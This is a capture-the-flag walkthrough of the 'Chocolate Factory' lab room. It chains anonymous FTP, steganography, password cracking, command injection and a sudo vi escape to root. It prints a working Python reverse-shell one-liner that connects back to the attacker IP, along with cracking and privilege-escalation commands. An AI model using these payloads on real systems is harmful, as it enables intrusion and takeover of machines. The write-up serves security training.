# Chocolate Factory CTF — Full Walkthrough

**Room:** Chocolate Factory | **Difficulty:** Easy | **Flags:** 2

| Detail | Value |
|--------|-------|
| Target IP | `10.49.141.219` |
| Attack Machine | Kali Linux |
| Attack IP | `192.168.192.149` |
| Walkthrough by | Komal |
| Date | May 30, 2026 |

---

## Flags Overview

| # | Method |
|---|--------|
| 01 | Anonymous FTP → steganography → password cracking → RCE |
| 02 | `sudo vi` privilege escalation → Fernet decryption |

---

## Phase 1: Reconnaissance

```bash
nmap -sV -sC -p- 10.49.141.219 -oN nmap_scan.txt
```

**Open Ports:**

| Port | Service |
|------|---------|
| 21/tcp | FTP (vsftpd 3.0.3) |
| 80/tcp | HTTP (Apache 2.4.41) |
| 113/tcp | Ident service |

---

## Phase 2: Steganography & Password Cracking

### Anonymous FTP

```bash
# Connect anonymously
ftp 10.49.141.219
# username: anonymous
# password: (empty)

# Download suspicious image
get gum_room.jpg
```

### Extract Hidden Data

```bash
steghide extract -sf gum_room.jpg
# Passphrase: (empty/Enter)
```

Extracted `b64.txt` — a base64-encoded shadow file. After decoding, cracked the hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```

**Credentials:** `charlie:cn7824`

---

## Phase 3: Remote Code Execution

### Reverse Engineering

Extracted a Fernet encryption key from `/key_rev_key` binary:

```bash
strings key_rev_key
```

### Command Injection

Logged into `validate.php` with `charlie:cn7824` and found command injection in the `command` parameter of `home.php`.

### Reverse Shell

```bash
# Start listener
nc -lvnp 4444

# Inject Python reverse shell via the vulnerable parameter
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.192.149",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Shell obtained as user `charlie`.**

---

## Phase 4: User Flag

```bash
# Found SSH private key
cat /home/charlie/teleport

# Use it for stable SSH access
chmod 600 teleport
ssh -i teleport charlie@10.49.141.219

# Read user flag
cat /home/charlie/user.txt
```

---

## Phase 5: Privilege Escalation — Root

### Sudo Enumeration

```bash
sudo -l
```

**Result:** `charlie` can run `/usr/bin/vi` as **root** without a password.

### Vi Escape (GTFOBins)

```bash
sudo /usr/bin/vi
# Inside vi, type:
:!/bin/bash
```

**Root shell obtained.**

### Decrypting the Root Flag

The root flag was encrypted with Fernet. Used the extracted key to decrypt:

```python
from cryptography.fernet import Fernet
key = "<extracted_key>"
fernet = Fernet(key)
with open("/root/root.py", "r") as f:
    encrypted = f.read()
decrypted = fernet.decrypt(encrypted.encode())
print(decrypted.decode())
```

**Flag 02 captured.**

---

## Vulnerability Chain

1. **Anonymous FTP** — Exposed files without authentication
2. **Steganography** — Hidden data embedded in images
3. **Weak credentials** — Password cracked with `rockyou.txt`
4. **Command injection** — Unsanitized user input
5. **SSH key exposure** — Insecure permissions on private key
6. **Sudo misconfiguration** — Passwordless sudo for `vi`
7. **GTFOBins abuse** — `vi` escape to shell as root
8. **Fernet encryption misuse** — Key stored in a binary

## Key Takeaways

- **Always check for anonymous FTP** — it's a common misconfiguration
- **Steganography tools** like `steghide` can hide credentials in images
- **`sudo vi` is effectively root** — use `visudo` to audit permissions
- **GTFOBins** is an essential resource for privilege escalation
